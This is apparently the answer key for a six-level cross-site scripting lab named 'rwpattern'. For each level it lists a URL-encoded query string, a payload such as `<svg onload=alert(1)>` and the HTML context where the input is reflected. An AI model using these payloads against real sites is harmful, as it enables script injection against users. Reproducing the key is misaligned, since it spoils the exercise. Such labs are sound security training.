# rwpattern — solutions

Real-world page templates (search, profile, 404, comments, admin, API docs).

### rwpattern-level1

`/rwpattern/level1/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: reflected in <p>Results for: QUERY</p>

### rwpattern-level2

`/rwpattern/level2/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in username span

### rwpattern-level3

`/rwpattern/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in 404 <h1>

### rwpattern-level4

`/rwpattern/level4/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: raw reflection in comment <p>

### rwpattern-level5

`/rwpattern/level5/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: reflected in <td> and <title>; body td triggers tag

### rwpattern-level6

`/rwpattern/level6/?query=%3C%2Fcode%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</code><svg onload=alert(1)>`
- context: inside <code> block; close then inject
